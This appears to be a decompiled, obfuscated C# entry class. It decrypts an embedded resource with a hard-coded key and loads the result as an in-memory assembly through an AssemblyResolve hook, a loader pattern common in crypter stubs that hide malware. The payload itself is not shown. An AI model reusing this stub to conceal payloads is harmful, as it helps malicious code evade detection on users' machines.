using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using ns0;
using ns1;

namespace X;

internal static class W
{
	[CompilerGenerated]
	private sealed class R
	{
		public byte[] F;

		internal Assembly E(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			if (resolveEventArgs_0.Name.Contains("ForMe"))
			{
				return appDomain.Load(F);
			}
			return null;
		}
	}

	[STAThread]
	private static void Main()
	{
		U.smethod_0();
	}

	static W()
	{
		byte[] F = Form1.smethod_0(Resources.U, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		AppDomain.CurrentDomain.AssemblyResolve += delegate(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			AppDomain appDomain = (AppDomain)object_0;
			return resolveEventArgs_0.Name.Contains("ForMe") ? appDomain.Load(F) : null;
		};
	}
}
